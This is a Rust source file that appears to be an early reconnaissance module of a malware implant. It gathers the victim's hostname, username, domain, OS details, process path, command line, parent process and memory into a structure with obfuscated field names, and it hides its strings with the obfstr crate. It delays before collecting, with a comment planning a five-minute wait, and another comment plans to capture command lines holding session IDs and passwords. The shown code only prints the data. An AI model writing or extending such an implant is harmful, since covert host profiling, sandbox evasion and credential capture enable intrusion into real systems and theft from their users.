use serde::{Deserialize, Serialize};
use sysinfo::System;
use std::process;
use obfstr::obfstr;

use collector::link_util::bytes_to_gigabytes_string;
use collector::link_util::cmdline;
use collector::link_util::get_domain_name;
use collector::link_util::process_name_and_parent;
use collector::link_util::process_path;
use collector::link_util::working_dir;

use std::time::Duration;
use std::thread;

#[derive(Serialize, Deserialize, PartialEq, Clone)]
pub struct POD {
    #[serde(rename = "a")]
    pub session_id: String,
    #[serde(rename = "b")]
    pub hostname: String,
    #[serde(rename = "c")]
    pub username: String,
    #[serde(rename = "d")]
    pub domain: String,
    #[serde(rename = "e")]
    pub arch: String,
    #[serde(rename = "f")]
    pub distro: String,
    #[serde(rename = "g")]
    pub desktop_env: String,
    #[serde(rename = "h")]
    pub cmdline: String,
    #[serde(rename = "i")]
    pub working_dir: String,
    #[serde(rename = "j")]
    pub process_path: String,
    #[serde(rename = "k")]
    pub process_name: String,
    #[serde(rename = "l")]
    pub pid: u32,
    #[serde(rename = "m")]
    pub parent_name: String,
    #[serde(rename = "gh")]
    pub ppid: u32,
    #[serde(rename = "t")]
    pub total_memory: String,
    #[serde(rename = "u")]
    pub used_memory: String,
    #[serde(rename = "v")]
    pub nb_cpu: usize,
}
impl std::fmt::Display for POD {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}",obfstr!("POD Info:\n"))?;
        write!(f, "{} {}\n",obfstr!("Session ID:"), self.session_id)?;
        write!(f, "{} {}\n",obfstr!("Hostname:"), self.hostname)?;
        write!(f, "{} {}\n",obfstr!("Username:"), self.username)?;
        write!(f, "{} {}\n",obfstr!("Domain:"), self.domain)?;
        write!(f, "{} {}\n",obfstr!("Architecture:"), self.arch)?;
        write!(f, "{} {}\n",obfstr!("Distribution:"), self.distro)?;
        write!(f, "{} {}\n",obfstr!("Desktop Environment:"), self.desktop_env)?;
        write!(f, "{} {}\n",obfstr!("Command Line:"), self.cmdline)?;
        write!(f, "{} {}\n",obfstr!("Working Directory:"), self.working_dir)?;
        write!(f, "{} {}\n",obfstr!("Process Path:"), self.process_path)?;
        write!(f, "{} {}\n",obfstr!("Process Name:"), self.process_name)?;
        write!(f, "{} {}\n",obfstr!("PID:"), self.pid)?;
        write!(f, "{} {}\n",obfstr!("Parent Name:"), self.parent_name)?;
        write!(f, "{} {}\n",obfstr!("PPID:"), self.ppid)?;
        write!(f, "{} {}\n",obfstr!("Total Memory:"), self.total_memory)?;
        write!(f, "{} {}\n",obfstr!("Used Memory:"), self.used_memory)?;
        write!(f, "{} {}\n",obfstr!("CPU Count:"), self.nb_cpu)
    }
}

fn collector(session_id: &String){
    // TODO attendre 5 minutes
    let sys: System = System::new_all();
    let (process_name, parent_name, ppid) = process_name_and_parent(&sys);
    let process_path: String = process_path();

    let mut post_data: POD = POD {
        session_id: session_id.to_string(),
        hostname: whoami::devicename(),
        username: whoami::username(),
        domain: get_domain_name(),
        arch: whoami::arch().to_string(),
        distro: whoami::distro(),
        desktop_env: whoami::desktop_env().to_string(),
        pid: process::id(),
        ppid: ppid,
        process_name: process_name,
        process_path: process_path,
        working_dir: working_dir(),
        cmdline: cmdline(),
        parent_name: parent_name,
        total_memory: bytes_to_gigabytes_string(sys.total_memory()),
        used_memory: bytes_to_gigabytes_string(sys.used_memory()),
        nb_cpu: sys.cpus().len(),
    };
    print!("{:#}",post_data);
}


fn wait_seconds(seconds: u64) {
    for i in 0..seconds {
        let remaining = seconds - i;
        println!("Reste : {}m {:02}s", remaining / 60, remaining % 60);
        thread::sleep(Duration::from_secs(1));
    }
    println!("Terminé !");
}


fn main() {
    println!("Hello, world!");
    wait_seconds(5);
    // TODO attendre 5 minutes
    // chopper des commandline aussi pour le session id et le password
    let session_id="yolo".to_string();
    collector(&session_id)
}
